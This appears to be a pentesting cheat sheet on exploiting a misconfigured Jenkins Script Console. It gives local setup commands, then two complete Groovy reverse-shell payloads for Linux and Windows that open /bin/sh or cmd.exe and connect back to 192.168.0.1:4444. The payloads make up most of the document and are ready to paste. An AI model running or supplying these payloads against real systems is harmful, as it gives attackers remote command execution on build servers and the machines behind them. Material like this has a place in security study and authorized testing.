# Jenkins/Groovy Misuse

```
Description: Jenkins is a Java-based automation server used to build, test, and deploy code automatically
You can configure tasks through a web interface and Groovy scripts
Groovy is a scripting language that runs on the Java Virtual Machine (JVM)

Hacker: If Jenkins misconfigured, can run Groovy code for remote code execution

# running Jenkins locally
wget https://get.jenkins.io/war-stable/jenkins.war
java -jar jenkins.war --httpPort=8080

Browser: http://localhost:8080
If Jenkins is already running on a target, go to http://target:8080/script
```

# Victim Machine
```
# Login to Jenkins Script Console
http://<target-ip>:8080/script

# Modify Java Payload to Groovy Syntax (Linux)
# Linux Reverse Shell
String host="192.168.0.1";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Modify Java Payload to Groovy Syntax (Windows)
# Window Reverse Shell
String host="192.168.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Back to README.md
[BACK](/README.md)